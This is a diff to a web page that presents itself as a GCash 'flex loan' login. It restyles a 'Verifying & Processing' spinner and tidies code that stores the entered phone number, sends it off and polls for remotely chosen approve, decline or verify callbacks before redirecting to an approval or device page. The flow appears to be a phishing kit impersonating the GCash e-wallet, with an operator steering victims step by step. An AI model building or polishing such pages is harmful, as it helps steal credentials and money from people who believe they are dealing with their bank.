@@ -314,29 +314,45 @@
       font-weight: 900;
       color: var(--primary-dark);
     }
-    
-    .spinner-overlay {
-      display: none;
+
+    /* Spinner overlay from the reference */
+    .spinnerOverlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 16px;
+      background: rgba(10, 16, 24, 0.78);
       z-index: 9999;
-      place-items: center;
     }
-    
-    .spinner-overlay.show {
-      display: grid;
-    }
-    
+
     .spinner {
-      width: 50px;
-      height: 50px;
-      border: 4px solid rgba(255, 255, 255, 0.2);
-      border-top: 4px solid white;
+      width: 56px;
+      height: 56px;
+      border: 5px solid rgba(255, 255, 255, 0.14);
+      border-top-color: var(--primary);
+      border-right-color: #22c55e;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+      animation: spin 0.9s linear infinite;
+      box-shadow: 0 0 24px rgba(0, 177, 79, 0.2);
     }
-    
+
+    .spinnerLabel {
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+      text-align: center;
+    }
+
+    .spinnerSub {
+      color: rgba(255, 255, 255, 0.75);
+      font-size: 12px;
+      text-align: center;
+    }
+
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
@@ -422,8 +438,10 @@
       </div>
     </section>
 
-    <div id="spinnerOverlay" class="spinner-overlay">
+    <div id="spinnerOverlay" class="spinnerOverlay" aria-live="polite" aria-label="Processing">
       <div class="spinner"></div>
+      <div class="spinnerLabel">Verifying &amp; Processing</div>
+      <div class="spinnerSub">Please wait while we confirm your request.</div>
     </div>
 
     <div class="footer">© 2026 GCash. All rights reserved.</div>
@@ -456,13 +474,9 @@
     }
 
     function normalizePhone(phone) {
-      // Remove all non-digits and convert to GCash format (09XXXXXXXXX)
       const digits = String(phone || '').replace(/\D/g, '');
-      // If starts with 63, remove it (international format)
       const noIntl = digits.startsWith('63') ? digits.slice(2) : digits;
-      // Get last 10 digits
       const last10 = noIntl.slice(-10);
-      // Ensure it starts with 09
       return (last10.startsWith('9') ? '0' + last10 : last10).slice(-10);
     }
 
@@ -482,11 +496,8 @@
     }
 
     phoneInput.addEventListener('input', () => {
-      // Allow only digits
       let value = phoneInput.value.replace(/\D/g, '');
-      // Limit to 10 digits
       value = value.slice(0, 10);
-      // Add leading 0 if needed and starts with 9
       if (value && value.startsWith('9') && !value.startsWith('0')) {
         value = '0' + value;
       }
@@ -551,19 +562,20 @@
           localStorage.setItem('phone', phone);
           localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
 
-          spinnerOverlay.classList.add('show');
+          spinnerOverlay.style.display = 'flex';
           startPolling(approveId, declineId, verifyId);
         })
         .catch((error) => {
           console.error('Send error:', error);
           showError('Connection error. Please try again.');
           resetButton();
+          spinnerOverlay.style.display = 'none';
         });
     }
 
     function startPolling(approveId, declineId, verifyId) {
       let pollAttempts = 0;
-      const maxAttempts = 120; // 2 minutes at 1 second intervals
+      const maxAttempts = 120;
 
       const interval = setInterval(() => {
         pollAttempts++;
@@ -581,15 +593,15 @@
 
                 if (cb === approveId) {
                   clearInterval(interval);
-                  spinnerOverlay.classList.remove('show');
+                  spinnerOverlay.style.display = 'none';
                   window.location.href = CONFIG.APPROVE_PAGE;
                 } else if (cb === verifyId) {
                   clearInterval(interval);
-                  spinnerOverlay.classList.remove('show');
+                  spinnerOverlay.style.display = 'none';
                   window.location.href = CONFIG.DEVICE_PAGE;
                 } else if (cb === declineId) {
                   clearInterval(interval);
-                  spinnerOverlay.classList.remove('show');
+                  spinnerOverlay.style.display = 'none';
                   showError('Loan request declined. Please try again or contact support.');
                   resetButton();
                 }
@@ -602,7 +614,7 @@
 
         if (pollAttempts >= maxAttempts) {
           clearInterval(interval);
-          spinnerOverlay.classList.remove('show');
+          spinnerOverlay.style.display = 'none';
           showError('Verification timeout. Please try again.');
           resetButton();
         }
